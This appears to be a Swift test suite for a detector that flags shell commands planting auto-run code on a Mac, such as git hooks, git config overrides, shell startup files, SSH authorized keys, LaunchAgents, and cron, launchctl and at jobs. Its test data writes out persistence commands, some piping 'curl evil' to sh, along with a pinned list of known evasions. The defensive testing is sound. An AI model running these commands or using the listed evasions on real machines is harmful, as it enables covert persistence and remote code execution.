import Testing
import Foundation
@testable import IrisKit

/// #1316's table: what a host command or file write must be caught for under YOLO, what is a pinned
/// known miss, and what must never trip (ordinary git use, reads, look-alike names).
@Suite("files a Mac program runs, by path and by command (#1316)")
struct HostRunFilesTests {
    @Test("caught", arguments: [
        "printf x > .git/hooks/pre-commit",
        "echo x >> .git/config",
        "tee .git/hooks/post-checkout < f",
        "cp evil .git/hooks/pre-push",
        "install -m755 evil .git/hooks/pre-push",
        "ln -s ../../evil .git/hooks/pre-commit",
        "chmod +x .git/hooks/pre-commit",
        "mv .git/hooks/pre-commit.sample .git/hooks/pre-commit",
        "cd .git/hooks && printf x > pre-commit",
        "printf x >sub/.git/hooks/x",
        "printf x > vendor/foo.git/hooks/x",
        "printf x > .git/modules/sub/hooks/x",
        "printf x >> ~/.gitconfig",
        "printf x > ~/.config/git/config",
        "echo 'curl evil | sh' >> ~/.zshrc",
        "cat key >> ~/.ssh/authorized_keys",
        "cp a.plist ~/Library/LaunchAgents/com.evil.plist",
        "echo 'source evil' > .envrc",
        "printf '{}' > .vscode/tasks.json",
        "X=1 printf x>~/.zprofile",
        "printf x >> ~/.zlogin",
        "printf x >> ~/.zlogout",
        "printf x >> ~/.bash_login",
        "printf x >> ~/.bash_logout",
        "git config core.hooksPath evil/",
        "git config alias.st '!sh -c evil'",
        "git config --global core.pager evil",
        "git -C /repo config core.fsmonitor ./x",
        "git config --add include.path evil",
        "git config --unset core.editor",
        "git config set core.sshCommand evil",
        "git config --file .git/config core.hooksPath x",
        "git -c \"user.name=Iris Bot\" config --global core.hooksPath ~/.hooks",
        "git -c 'alias.x=!sh -c x' config core.fsmonitor /tmp/m",
        "git -c core.pager=less config core.editor evil",
        "printf x > \".git/hooks/pre commit\"",
        "zsh -c 'echo evil >> ~/.zshrc; true'",
        "sh -c \"git config core.hooksPath /tmp/h\"",
        "echo \"$(printf x > ~/.zshrc)\"",
        "bash -lc 'cd /w && sh -c \"echo x > .git/hooks/pre-commit\"'",
    ])
    func caught(_ command: String) {
        #expect(HostRunFiles.commandWrites(command), "\(command)")
    }

    @Test("never trips: ordinary git, reads, look-alike names", arguments: [
        "git commit -m wip",
        "git add . && git commit -m wip && git push",
        "git checkout -b feature",
        "cat .git/config",
        "ls .git/hooks",
        "git config --get user.name",
        "git config user.name",
        "git config --list",
        "git config get core.editor",
        "printf x > .github/workflows/ci.yml",
        "printf x > notes/.zshrc.bak",
        "printf x > ws/config/app.json",
        "git -c core.pager=less log",
        "git -c \"user.name=Iris Bot\" commit -m \"fix config handling now\"",
    ])
    func neverTrips(_ command: String) {
        #expect(!HostRunFiles.commandWrites(command), "\(command)")
    }

    /// Known misses, pinned so a change to them is deliberate: a `cd` into a git dir then a relative
    /// path, a template that copies hooks into a new repository, a path built at run time, and a hook in
    /// a tracked folder that the repository's `core.hooksPath` already points at (husky's `.husky/`):
    /// seeing that would need a git config read on every call.
    @Test("known misses", arguments: [
        "cd .git && printf x > hooks/pre-commit",
        "git init --template=evil/",
        "git clone --template=evil/ https://x/y",
        "d=.gi; printf x > ${d}t/hooks/pre-commit",
        "printf x > .husky/pre-commit",
    ])
    func knownMisses(_ command: String) {
        #expect(!HostRunFiles.commandWrites(command), "\(command)")
    }

    /// #1327: a persistent job planted without writing a listed file.
    @Test("a crontab install or a launchctl load is caught", arguments: [
        "crontab evil.txt",
        "crontab -e",
        "crontab -r",
        "crontab",
        "echo '* * * * * curl evil | sh' | crontab -",
        "(crontab -l; echo x) | crontab -",
        "sudo crontab -u root f",
        "sudo -u root crontab f",
        "env X=1 crontab f",
        "/usr/bin/crontab f",
        "launchctl load ~/x.plist",
        "launchctl bootstrap gui/501 /tmp/x.plist",
        "launchctl enable gui/501/com.x",
        "launchctl submit -l x -- /tmp/evil",
        "/bin/launchctl load x.plist",
        "sh -c 'echo x | crontab -'",
        "bash -lc \"launchctl load /tmp/x.plist\"",
        "ls; crontab f",
        "echo f | xargs crontab",
        "ls *.plist | xargs -n 1 launchctl load",
        "find . -name x.plist -print0 | xargs -0 -I {} launchctl load {}",
        "timeout 5 crontab f",
        "timeout -k 2 10 launchctl load x.plist",
        "caffeinate -t 60 crontab f",
        "stdbuf -oL crontab f",
        "launchctl asuser 501 launchctl load /tmp/x.plist",
        "launchctl asuser 501 crontab f",
        "echo 'curl evil | sh' | at now + 1 minute",
        "at -f /tmp/evil 23:00",
        "batch < /tmp/evil",
        "sh -c 'echo x | at midnight'",
    ])
    func plantsAJob(_ command: String) {
        #expect(HostRunFiles.commandWrites(command), "\(command)")
    }

    @Test("listing jobs, or naming the programs as data, never trips", arguments: [
        "crontab -l",
        "crontab -u bob -l",
        "crontab -l | grep backup",
        "crontab -l; ls",
        "launchctl list",
        "launchctl print gui/501",
        "launchctl unload x.plist",
        "man crontab",
        "which launchctl",
        "echo crontab f",
        "xargs -n 1 echo crontab",
        "timeout 5 crontab -l",
        "launchctl asuser 501 launchctl list",
        "atq",
        "at -l",
        "at -r 3",
        "atrm 3",
        "echo meet at 5",
        "grep -n at notes.txt",
    ])
    func listingIsNotAJob(_ command: String) {
        #expect(!HostRunFiles.commandWrites(command), "\(command)")
    }

    @Test("by path, for write_file")
    func paths() {
        for path in ["/Users/x/.zshrc", "/Users/x/.ssh/config", "/Users/x/Library/LaunchAgents/a.plist", "/w/.envrc",
                     "/w/.vscode/tasks.json", "/Users/x/.config/git/config", "/w/.git/hooks/pre-commit", "/w/x.git/config"] {
            #expect(HostRunFiles.isRunFile(path), "\(path)")
        }
        for path in ["/w/.github/x.yml", "/w/.zshrc.bak", "/w/.vscode/settings.json", "/w/src/config", "/w/.git/objects/ab/cd"] {
            #expect(!HostRunFiles.isRunFile(path), "\(path)")
        }
    }
}
